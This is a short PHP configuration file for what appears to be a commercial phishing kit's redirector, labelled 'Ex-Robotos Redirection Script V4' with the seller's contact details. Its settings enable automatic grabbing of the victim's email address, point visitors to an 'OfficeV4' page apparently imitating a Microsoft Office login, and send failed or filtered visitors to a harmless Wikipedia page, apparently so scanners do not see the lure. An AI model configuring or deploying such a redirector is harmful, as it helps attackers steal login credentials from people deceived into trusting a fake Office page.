<?php
/* 
Ex-Robotos Redirection Script V4 2020
Email: exrobotos.official@gmail.com
Facebook: facebook.com/ExRobotos
ICQ: @ExRobotos
*/
$autoEmail="true";//"true":Auto email grabing "false":without auto email grabing
$pagelink="https://domain/foldername/OfficeV4";
$FailRedirect="https://www.wikipedia.org/wiki/Microsoft_Office";
$redirecttype="2";// 1:header - 2:script
?>